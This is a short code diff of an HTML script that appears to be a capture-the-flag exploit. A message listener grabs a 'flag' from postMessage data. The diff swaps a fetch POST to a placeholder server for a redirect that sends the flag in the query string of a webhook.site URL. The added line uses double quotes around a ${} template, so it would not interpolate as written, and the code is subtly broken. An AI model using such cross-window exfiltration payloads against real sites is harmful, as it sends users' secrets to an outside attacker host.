@@ -8,12 +8,7 @@
     window.addEventListener('message', (event) => {
       if (event.data.type === 'create') {
         // Send the flag to your server or log it
-        fetch('https://yourserver.com/save', {
-          method: 'POST',
-          body: JSON.stringify({ flag: event.data.payload }),
-          headers: { 'Content-Type': 'application/json' }
-        });
-        console.log('Flag:', event.data.payload);
+        window.location.href = "https://webhook.site/2f16d9d2-d7dc-41ed-b791-41ba3e4de387?flag=${event.data.payload}"
       }
     });
   </script>
